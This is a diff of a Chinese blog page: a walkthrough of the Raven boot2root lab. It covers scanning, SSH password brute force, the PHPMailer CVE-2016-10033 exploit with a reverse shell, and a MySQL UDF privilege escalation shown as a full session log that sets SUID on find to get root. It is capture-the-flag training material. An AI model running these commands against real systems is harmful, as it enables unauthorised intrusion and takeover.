@@ -342,35 +342,36 @@
       
         
           
-            <p>参考链接：<a href="https://www.anquanke.com/post/id/163996" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163996</a></p>
-<p>攻击机 ip：192.168.195.133<br>靶机 ip：192.168.195.139</p>
+            <p>攻击机 ip：192.168.195.133<br>靶机 ip：192.168.195.139</p>
 <ol>
 <li>探测存活主机<blockquote>
 <p>root@kali:~# arp-scan -l </p>
 </blockquote>
 </li>
 </ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-b8ca7963f8b2df0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-b8ca7963f8b2df0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
 <ol start="2">
 <li>端口探测（<code>nmap</code>为例）<blockquote>
 <p>root@kali:~# nmap -sV -p- 192.168.195.139</p>
 </blockquote>
 </li>
 </ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-beb2dacfe6a374ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-beb2dacfe6a374ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
 <ol start="3">
 <li>使用 <code>Dirbuster</code> 工具进行敏感目录扫描</li>
 </ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-4eaec0f613623e7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>其中通过访问<code>vendor</code>目录发现<code>PHPMailerAutoload.php</code>文件，查询后发现<code>CVE-2016-10033</code>是<code>PHPMailer</code>中存在的高危安全漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。<br>CVE参考链接：<a href="https://paper.seebug.org/161/" target="_blank" rel="noopener">https://paper.seebug.org/161/</a></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-3c88f4f47b440312.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>通过访问<code>service.html</code>查看源代码发现flag</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-832e8161ea9e72b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<ul>
+<li>方法一<br><img src="https://upload-images.jianshu.io/upload_images/12585049-4eaec0f613623e7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>其中通过访问<code>vendor</code>目录发现<code>PHPMailerAutoload.php</code>文件，查询后发现<code>CVE-2016-10033</code>是<code>PHPMailer</code>中存在的高危安全漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。（见方法二）</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-3c88f4f47b440312.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br>通过访问<code>service.html</code>查看源代码发现flag</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-832e8161ea9e72b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
 <ol start="4">
 <li>由于发现<code>wordpress</code>目录，所以使用<code>Wpscan</code>扫描<br><code>Wpscan</code>是一个扫描<code>WordPress</code>漏洞的黑盒子扫描器，可以扫描出<code>wordpress</code>的版本，主题，插件，后台用户以及爆破后台用户密码等</li>
 </ol>
 <blockquote>
 <p>root@kali:~# wpscan –url “<a href="http://192.168.195.139/wordpress&quot;" target="_blank" rel="noopener">http://192.168.195.139/wordpress&quot;</a> -e u vp<br><code>-e</code>   枚举方式<br><code>u</code>     id 为1-10的用户名<br><code>vp</code> 扫描脆弱插件</p>
 </blockquote>
-<p>探测到两个用户名，如图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-e4ec913e60c5e69e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p>探测到两个用户名，如图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-e4ec913e60c5e69e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
 <ol start="5">
 <li>使用<code>hydra</code>对其进行<code>SSH</code>爆破<blockquote>
 <p>root@kali:~# hydra -l michael -P ‘/root/Desktop/常用密码.dict’ -V -o ssh.log 192.168.195.139 ssh</p>
@@ -384,24 +385,55 @@
 </blockquote>
 </li>
 </ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7839927e24636bbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7839927e24636bbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
 <p>查询到 <code>/var/www</code>目录下存放<code>flag2.txt</code></p>
 <blockquote>
 <p>michael@Raven:/var/www$ cat flag2.txt</p>
 </blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-67af668fdd262491.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-67af668fdd262491.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"></p>
 <p>在<code>wordpress</code>的<code>wp_config.php</code>里找到<code>mysql</code>的账户密码</p>
 <blockquote>
 <p>michael@Raven:/var/www/html/wordpress$ vi wp-config.php</p>
 </blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7ca07e6e6a781951.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7ca07e6e6a781951.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"></p>
 <ol start="7">
-<li>上传一个大马并访问<br>通过连接<code>mysql</code>查询到<code>flag3</code> <code>flag4</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-1713571b428c5244.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
+<li>上传一个大马并访问<br>通过连接<code>mysql</code>查询到<code>flag3</code> <code>flag4</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-1713571b428c5244.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"></li>
 </ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-8eafc11f6696014e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-8eafc11f6696014e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"></p>
 <ol start="8">
-<li>提权<br>对<code>steven</code>的<code>hash</code>值进行<code>md5</code>解密得到<code>pink84</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-3b314d24ec72dead.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/12585049-a602b8f4d5fba6c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>由<code>python -c ’import pty; pty.spawn(&quot;/bin/sh&quot;)’</code>得到一个可以交互的<code>shell</code>，在有<code>root</code>密码的前提下可以<code>su</code>,<code>steven</code>是<code>root</code>账户<br><img src="https://upload-images.jianshu.io/upload_images/12585049-52640d3d45922438.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>成功提权至<code>root</code>账户</li>
+<li>提权<br>对<code>steven</code>的<code>hash</code>值进行<code>md5</code>解密得到<code>pink84</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-3b314d24ec72dead.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br><img src="https://upload-images.jianshu.io/upload_images/12585049-a602b8f4d5fba6c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>由<code>python -c ’import pty; pty.spawn(&quot;/bin/sh&quot;)’</code>得到一个可以交互的<code>shell</code>，在有<code>root</code>密码的前提下可以<code>su</code>,<code>steven</code>是<code>root</code>账户<br><img src="https://upload-images.jianshu.io/upload_images/12585049-52640d3d45922438.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br>成功提权至<code>root</code>账户</li>
 </ol>
+<ul>
+<li>方法二<h6 id="利用PHPMailer命令执行以及mysql-udf提权"><a href="#利用PHPMailer命令执行以及mysql-udf提权" class="headerlink" title="利用PHPMailer命令执行以及mysql udf提权"></a>利用<code>PHPMailer</code>命令执行以及<code>mysql udf</code>提权</h6>使用kali搜索漏洞有关的代码库<blockquote>
+<p>searchspolit phpmailer</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-990b39b22285941a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br>探测到<code>PHPMailer</code>版本为<code>5.2.16</code>，这里使用<code>pythohn</code>远程代码执行脚本<br><img src="https://upload-images.jianshu.io/upload_images/12585049-b257dfdd5e4a7144.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"></p>
+<p>拷贝脚本到本地</p>
+<blockquote>
+<p>cp /usr/share/exploitdb/platforms/php/webapps/40974.py /</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-b75036486099f955.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"></p>
+<p>查看并修改相关参数<br><img src="https://upload-images.jianshu.io/upload_images/12585049-a3c98a973dfb0263.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.png"></p>
+<p>编译运行代码，成功运行后将在文件根目录下生成 <code>wcute.php</code>文件<br><img src="https://upload-images.jianshu.io/upload_images/12585049-1655688fc280c3e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="19.png"></p>
+<p>本地开启监听，<code>wcute.php</code> 文件运行后<code>shell</code>成功反弹<br><img src="https://upload-images.jianshu.io/upload_images/12585049-2ac76242f6f75ad1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20.png"></p>
+<p>使用<code>python -c ’import pty; pty.spawn(&quot;/bin/bash&quot;)’</code>得到一个可以交互的<code>shell</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-caecdf03b0e0c20b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="21.png"></p>
+<p>在<code>wordpress</code>的<code>wp_config.php</code>里找到<code>mysql</code>的账户密码</p>
+<blockquote>
+<p>michael@Raven:/var/www/html/wordpress$ vi wp-config.php</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7ca07e6e6a781951.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="22.png"><br>使用<code>netstat -a</code>发现<code>mysql</code>服务启动<br><img src="https://upload-images.jianshu.io/upload_images/12585049-55560281031b8619.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="23.png"><br>查看进程发现<code>mysql</code>是以<code>root</code>权限运行的，此时想到了<code>mysql</code>提权，这里以<code>udf</code>提权为例<br><img src="https://upload-images.jianshu.io/upload_images/12585049-24fc4b8bf84830f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="24.png"></p>
+<p>查询到<code>mysql</code> <code>udf</code>提权<code>exp</code>编号为<code>1518</code>，拷贝<code>exp</code>到本地<code>/var/www/html</code></p>
+<blockquote>
+<p>cp /usr…… /var/www/html </p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-99843d2b9cfdb164.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="25.png"></p>
+<p>编译生成动态链接库文件，方便上传至靶机<br><img src="https://upload-images.jianshu.io/upload_images/12585049-324f13e80ee3c758.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="26.png"></p>
+<p>使用<code>wget</code>上传至靶机(主机开启<code>Apache</code>服务)<br><img src="https://upload-images.jianshu.io/upload_images/12585049-24c82363fc1c0d04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="27.png"></p>
+<p>靶机连接<code>mysql</code>开始进行提权操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.22 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use wordpress</span><br><span class="line">use wordpress</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">create table foo(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.43 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(&apos;/var/www/html/1518.so&apos;));</span><br><span class="line">insert into foo values(load_file(&apos;/var/www/html/1518.so&apos;));</span><br><span class="line">Query OK, 1 row affected (0.10 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/1518.so&apos;;</span><br><span class="line">select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/1518.so&apos;;</span><br><span class="line">Query OK, 1 row affected (0.06 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create function do_system returns integer soname &apos;1518.so&apos;;</span><br><span class="line">create function do_system returns integer soname &apos;1518.so&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.10 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">select * from mysql.func;</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">| name      | ret | dl      | type     |</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">| do_system |   2 | 1518.so | function |</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(&apos;chmod u+s /usr/bin/find&apos;);</span><br><span class="line">select do_system(&apos;chmod u+s /usr/bin/find&apos;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| do_system(&apos;chmod u+s /usr/bin/find&apos;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    0 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.02 sec)</span><br><span class="line">mysql&gt; quit</span><br><span class="line">quit</span><br><span class="line">Bye</span><br><span class="line">www-data@Raven:/var/www/html$ touch foo</span><br><span class="line">touch foo</span><br><span class="line">www-data@Raven:/var/www/html$ find foo -exec &apos;whoami&apos; \;</span><br><span class="line">find foo -exec &apos;whoami&apos; \;</span><br><span class="line">root</span><br><span class="line">www-data@Raven:/var/www/html$ find foo -exec &apos;/bin/sh&apos; \;</span><br><span class="line">find foo -exec &apos;/bin/sh&apos; \;</span><br><span class="line"># whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"># pwd</span><br><span class="line">pwd</span><br><span class="line">/var/www/html</span><br><span class="line"># cd /root</span><br><span class="line">cd /root</span><br><span class="line"># ls</span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line"># cat flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">______</span><br><span class="line"></span><br><span class="line">| ___ \</span><br><span class="line"></span><br><span class="line">| |_/ /__ ___   _____ _ __</span><br><span class="line"></span><br><span class="line">|    // _` \ \ / / _ \ &apos;_ \</span><br><span class="line"></span><br><span class="line">| |\ \ (_| |\ V /  __/ | | |</span><br><span class="line"></span><br><span class="line">\_| \_\__,_| \_/ \___|_| |_|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;</span><br><span class="line"></span><br><span class="line">CONGRATULATIONS on successfully rooting Raven!</span><br><span class="line"></span><br><span class="line">This is my first Boot2Root VM - I hope you enjoyed it.</span><br><span class="line"></span><br><span class="line">Hit me up on Twitter and let me know what you thought:</span><br><span class="line"></span><br><span class="line">@mccannwj / wjmccann.github.io</span><br></pre></td></tr></table></figure></p>
+<p>成功提权</p>
+<p>参考链接：<br><a href="https://www.anquanke.com/post/id/163996" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163996</a><br><a href="https://www.cnblogs.com/bmjoker/p/10034001.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/10034001.html</a></p>
 
           
         
